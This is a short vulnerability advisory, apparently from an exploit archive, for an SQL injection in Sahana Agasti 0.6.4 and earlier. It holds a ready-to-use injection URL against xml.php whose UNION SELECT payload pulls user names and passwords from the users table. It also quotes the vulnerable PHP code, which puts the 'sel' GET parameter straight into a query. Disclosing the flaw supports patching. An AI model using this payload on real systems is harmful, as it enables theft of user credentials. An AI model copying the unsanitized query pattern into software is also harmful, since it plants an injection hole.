#  [ Sahana Agasti <= 0.6.4 ]  SQL Injection Vulnerability     #
################################################################
#
# Script: "Agasti is the PHP based project of the Sahana Software Foundation.
#
# Script site: http://www.sahanafoundation.org/
# Download: https://launchpad.net/sahana-agasti/
#
# [SQL] Vuln:
# http://site.com/agasti/sahana-0.6.4/www/xml.php?act=add_loc&sel=1/**/UNION/**/SELECT/**/null,concat(CHAR(60,66,82,62),concat_ws(char(58),user_name,password)),null/**/FROM/**/users
#   
#   
# Bug: ./sahana-0.6.4/www/xml.php (lines: 17-21, 200-223)
#
# ...
# $act=$_GET{"act"};                                                          //
#
# if($act==&#039;add_loc&#039;)                                                         // (1)
# {
#         _shn_get_level_location();                                          //
# ...
#
# function _shn_get_level_location(){
#         require_once(&#039;../3rd/adodb/adodb.inc.php&#039;);
#         require_once(&#039;../conf/sysconf.inc.php&#039;);
#         //Make the connection to $global[&#039;db&#039;]
#         $db = NewADOConnection($conf[&#039;db_engine&#039;]);
#        $db ->Connect($conf[&#039;db_host&#039;].($conf[&#039;db_port&#039;]?&#039;:&#039;.$conf[&#039;db_port&#039;]:&#039;&#039;),$conf[&#039;db_user&#039;],$conf[&#039;db_pass&#039;],$conf[&#039;db_name&#039;]);
#
#
#         $level=$_GET{"sel"};                                                // (2)
#         if($level==1){
#                 echo "none,";
#         }
#         $q = "SELECT location.name,location.loc_uuid,parent_id FROM location WHERE location.opt_location_type={$level}";          // (3) SQL
#         $res_child=$db->Execute($q);
#         if($res_child->EOF)
#         return;
#         while(!$res_child->EOF){
#                 $res=$res.",".$res_child->fields[1];
#                 $res=$res.",".$res_child->fields[0];
#                $res_child->MoveNext();
#        }
#         echo $res;                                                          // (4)
# }
# ... 
#
#
###############################################



